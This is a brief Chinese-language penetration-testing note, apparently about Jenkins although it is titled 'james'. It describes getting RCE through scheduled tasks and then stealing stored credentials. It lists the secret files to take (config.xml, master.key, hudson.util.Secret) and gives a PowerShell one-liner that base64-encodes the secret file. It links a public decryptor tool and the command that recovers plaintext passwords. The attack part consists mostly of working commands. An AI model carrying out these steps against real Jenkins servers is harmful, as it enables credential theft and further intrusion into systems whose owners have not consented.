# james

首先可以执行命令，如果没有新任务上线的按钮，可以控制面板设置计划任务，来实现rce

主要就是关于James中的config.xml，可以获取密码\
需要如下

```clike
config.xml
master.key
hudson.util.Secret
```

```clike
1. 得到所需文件
master.key应该是256位
hudson.util.Secret是一个可执行文件，可以直接传，也可以base64编码后再传，如何编码如下：
powershell -c [convert]::ToBase64String((cat ..\..\secrets\hudson.util.Secret -Encoding byte)) 
2. 工具下载
https://github.com/hoto/jenkins-credentials-decryptor/releases/tag/1.2.0
3. 操作得到密码
 ./jenkins-credentials-decryptor -m master.key -s hudson.util.Secret -c config.xml 
```
